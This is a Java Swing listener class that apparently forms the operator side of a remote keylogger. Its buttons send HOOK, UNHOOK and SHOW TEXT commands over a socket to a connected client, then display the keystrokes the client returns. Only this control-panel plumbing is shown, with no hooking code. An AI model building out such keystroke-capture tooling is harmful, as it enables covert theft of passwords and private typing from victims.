package controller;

import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.io.IOException;

import javax.swing.JOptionPane;
import javax.swing.JTextArea;

import model.Client;
import view.ClientDesign;
import view.KeylogDesign;

public class KeylogListener implements ActionListener{
	
	private KeylogDesign keylogDesign;
	
	public KeylogListener(KeylogDesign keylogDesign)
	{
		this.keylogDesign = keylogDesign;
	}
	
	@Override
	public void actionPerformed(ActionEvent e) {
		String scr = e.getActionCommand();
		boolean isHook = false;
//		try {
//			Program.out.write(scr);
//			Program.out.newLine();
//			Program.out.flush();
//		} catch (IOException e2) {
//			// TODO Auto-generated catch block
//			e2.printStackTrace();
//		}
//		
		if ("HOOK".equals(scr))
		{
			try {
				Client.out.write(scr);
				Client.out.newLine();
				Client.out.flush();
			} catch (IOException e2) {
				// TODO Auto-generated catch block
				e2.printStackTrace();
			}
				
			//JOptionPane.showMessageDialog(null, "Start Hook");
			
		}
		else if ("UNHOOK".equals(scr))
		{

			try {
				Client.out.write(scr);
				Client.out.newLine();
				Client.out.flush();
			} catch (IOException e2) {
				// TODO Auto-generated catch block
				e2.printStackTrace();
			}
				
			//JOptionPane.showMessageDialog(null, "Start UnHook");
		}
		else if ("SHOW TEXT".equals(scr))
		{
			try {
				Client.out.write(scr);
				Client.out.newLine();
				Client.out.flush();
			} catch (IOException e2) {
				// TODO Auto-generated catch block
				e2.printStackTrace();
			}
			
				String outString = "";
		        try {
					outString = Client.in.readLine();
				} catch (IOException e1) {
					// TODO Auto-generated catch block
					e1.printStackTrace();
				}
		        outString = outString.trim();
		        
		        this.keylogDesign.text.append(outString); 
		        
		        
		}
		else if ("CLEAR TEXT".equals(scr))
		{
//			
			this.keylogDesign.text.setText("");
//			
		}
		
	}
	
	
}
